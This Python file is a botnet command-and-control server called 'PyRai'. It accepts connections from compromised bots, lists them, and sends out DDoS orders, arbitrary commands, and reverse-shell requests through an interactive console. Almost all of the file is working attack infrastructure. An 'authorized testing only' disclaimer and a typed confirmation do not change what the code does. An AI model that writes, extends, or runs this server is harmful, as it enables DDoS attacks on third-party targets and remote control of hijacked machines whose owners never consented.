#!/usr/bin/env python3
"""
PyRai C2 Server - Command and Control for Botnet Management
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
"""

import socket
import threading
import json
import time
import logging
from datetime import datetime
import sys
import os

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

# C2 Configuration
C2_PORT = 31340
REVERSE_SHELL_PORT = 31341
MAX_BOTS = 100

# Bot management
connected_bots = {}
bots_lock = threading.Lock()

class BotHandler:
    """Handle individual bot connections"""
    
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.bot_id = f"{addr[0]}:{addr[1]}"
        self.authenticated = False
        
    def handle_bot(self):
        """Handle bot connection and commands"""
        try:
            # Receive bot info
            data = self.conn.recv(4096)
            if not data:
                return
                
            bot_info = json.loads(data.decode())
            bot_info['connected_time'] = datetime.now()
            bot_info['last_seen'] = datetime.now()
            
            with bots_lock:
                connected_bots[self.bot_id] = {
                    'info': bot_info,
                    'connection': self.conn,
                    'handler': self
                }
            
            logging.info(f"[C2] New bot connected: {self.bot_id}")
            logging.info(f"[C2] Bot info: {bot_info}")
            
            # Keep connection alive and handle commands
            while True:
                try:
                    # Send heartbeat
                    self.conn.send(b"heartbeat")
                    time.sleep(30)
                    
                    # Update last seen
                    with bots_lock:
                        if self.bot_id in connected_bots:
                            connected_bots[self.bot_id]['info']['last_seen'] = datetime.now()
                            
                except Exception as e:
                    logging.error(f"[C2] Bot {self.bot_id} disconnected: {str(e)}")
                    break
                    
        except Exception as e:
            logging.error(f"[C2] Error handling bot {self.bot_id}: {str(e)}")
        finally:
            self.cleanup()
    
    def send_command(self, command):
        """Send command to bot"""
        try:
            self.conn.send(command.encode())
            return True
        except Exception as e:
            logging.error(f"[C2] Failed to send command to {self.bot_id}: {str(e)}")
            return False
    
    def cleanup(self):
        """Clean up bot connection"""
        try:
            self.conn.close()
        except:
            pass
        
        with bots_lock:
            if self.bot_id in connected_bots:
                del connected_bots[self.bot_id]
                logging.info(f"[C2] Bot {self.bot_id} removed from botnet")

class ReverseShellHandler:
    """Handle reverse shell connections"""
    
    def __init__(self, port):
        self.port = port
        self.active_shells = {}
        
    def start_listener(self):
        """Start reverse shell listener"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.port))
            server.listen(5)
            
            logging.info(f"[C2] Reverse shell listener started on port {self.port}")
            
            while True:
                conn, addr = server.accept()
                shell_id = f"{addr[0]}:{addr[1]}"
                
                logging.info(f"[C2] Reverse shell connected: {shell_id}")
                
                # Handle shell in separate thread
                shell_thread = threading.Thread(
                    target=self.handle_shell,
                    args=(conn, addr, shell_id),
                    daemon=True
                )
                shell_thread.start()
                
        except Exception as e:
            logging.error(f"[C2] Reverse shell listener error: {str(e)}")
    
    def handle_shell(self, conn, addr, shell_id):
        """Handle individual reverse shell"""
        try:
            self.active_shells[shell_id] = conn
            
            while True:
                try:
                    # Interactive shell would go here
                    # For now, just keep connection alive
                    time.sleep(1)
                except:
                    break
                    
        except Exception as e:
            logging.error(f"[C2] Shell {shell_id} error: {str(e)}")
        finally:
            try:
                conn.close()
            except:
                pass
            if shell_id in self.active_shells:
                del self.active_shells[shell_id]
                logging.info(f"[C2] Shell {shell_id} disconnected")

class C2Server:
    """Main C2 server class"""
    
    def __init__(self):
        self.running = False
        self.shell_handler = ReverseShellHandler(REVERSE_SHELL_PORT)
        
    def start_server(self):
        """Start the C2 server"""
        self.running = True
        
        # Start reverse shell listener
        shell_thread = threading.Thread(
            target=self.shell_handler.start_listener,
            daemon=True
        )
        shell_thread.start()
        
        # Start main C2 listener
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", C2_PORT))
            server.listen(10)
            
            logging.info(f"[C2] Server started on port {C2_PORT}")
            logging.info(f"[C2] Reverse shell port: {REVERSE_SHELL_PORT}")
            
            while self.running:
                try:
                    conn, addr = server.accept()
                    
                    # Check bot limit
                    with bots_lock:
                        if len(connected_bots) >= MAX_BOTS:
                            logging.warning(f"[C2] Bot limit reached, rejecting {addr}")
                            conn.close()
                            continue
                    
                    # Handle bot in separate thread
                    bot_handler = BotHandler(conn, addr)
                    bot_thread = threading.Thread(
                        target=bot_handler.handle_bot,
                        daemon=True
                    )
                    bot_thread.start()
                    
                except Exception as e:
                    if self.running:
                        logging.error(f"[C2] Server error: {str(e)}")
                        
        except Exception as e:
            logging.error(f"[C2] Failed to start server: {str(e)}")
    
    def stop_server(self):
        """Stop the C2 server"""
        self.running = False
        logging.info("[C2] Server stopping...")
    
    def send_command_to_bot(self, bot_id, command):
        """Send command to specific bot"""
        with bots_lock:
            if bot_id in connected_bots:
                handler = connected_bots[bot_id]['handler']
                return handler.send_command(command)
        return False
    
    def send_command_to_all(self, command):
        """Send command to all bots"""
        success_count = 0
        with bots_lock:
            for bot_id in list(connected_bots.keys()):
                if self.send_command_to_bot(bot_id, command):
                    success_count += 1
        return success_count
    
    def get_bot_status(self):
        """Get current bot status"""
        with bots_lock:
            return dict(connected_bots)

def print_banner():
    """Print C2 server banner"""
    print("="*60)
    print("PyRai C2 Server - Command and Control")
    print("ETHICAL DISCLAIMER: This tool is for authorized testing only.")
    print("="*60)

def print_help():
    """Print available commands"""
    print("\nAvailable Commands:")
    print("  status          - Show botnet status")
    print("  bots            - List connected bots")
    print("  ddos <ip> <port> <duration> - Launch DDoS attack")
    print("  shell <bot_id>  - Get reverse shell from bot")
    print("  cmd <command>   - Send command to all bots")
    print("  help            - Show this help")
    print("  quit            - Shutdown C2 server")

def interactive_console(c2_server):
    """Interactive console for C2 management"""
    print_help()
    
    while True:
        try:
            command = input("\nC2> ").strip()
            
            if not command:
                continue
                
            parts = command.split()
            cmd = parts[0].lower()
            
            if cmd == 'quit' or cmd == 'exit':
                break
            elif cmd == 'help':
                print_help()
            elif cmd == 'status':
                bots = c2_server.get_bot_status()
                print(f"\nBotnet Status:")
                print(f"Connected bots: {len(bots)}")
                print(f"Max bots: {MAX_BOTS}")
            elif cmd == 'bots':
                bots = c2_server.get_bot_status()
                print(f"\nConnected Bots ({len(bots)}):")
                for bot_id, bot_data in bots.items():
                    info = bot_data['info']
                    print(f"  {bot_id} - {info.get('os', 'unknown')} - {info.get('last_seen', 'unknown')}")
            elif cmd == 'ddos' and len(parts) >= 4:
                target_ip = parts[1]
                target_port = parts[2]
                duration = parts[3]
                ddos_cmd = f"ddos {target_ip} {target_port} {duration}"
                count = c2_server.send_command_to_all(ddos_cmd)
                print(f"DDoS command sent to {count} bots")
            elif cmd == 'shell' and len(parts) >= 2:
                bot_id = parts[1]
                if c2_server.send_command_to_bot(bot_id, "shell"):
                    print(f"Reverse shell requested from {bot_id}")
                else:
                    print(f"Failed to contact bot {bot_id}")
            elif cmd == 'cmd' and len(parts) >= 2:
                bot_cmd = " ".join(parts[1:])
                count = c2_server.send_command_to_all(bot_cmd)
                print(f"Command sent to {count} bots")
            else:
                print("Unknown command. Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {str(e)}")

def main():
    """Main C2 server function"""
    print_banner()
    
    # Safety confirmation
    print("\n[SAFETY CONFIRMATION]")
    print("This C2 server will:")
    print("- Accept connections from compromised bots")
    print("- Send commands to botnet members")
    print("- Coordinate DDoS attacks")
    print("- Manage reverse shell connections")
    print("Ensure you have proper authorization for this testing.")
    confirm = input("Type 'AUTHORIZED' to continue: ")
    
    if confirm != 'AUTHORIZED':
        logging.error("Safety confirmation failed. Exiting.")
        sys.exit(1)
    
    # Start C2 server
    c2_server = C2Server()
    
    # Start server in background thread
    server_thread = threading.Thread(target=c2_server.start_server, daemon=True)
    server_thread.start()
    
    # Start interactive console
    try:
        interactive_console(c2_server)
    except KeyboardInterrupt:
        pass
    finally:
        c2_server.stop_server()
        logging.info("[C2] Shutdown complete")

if __name__ == "__main__":
    main() 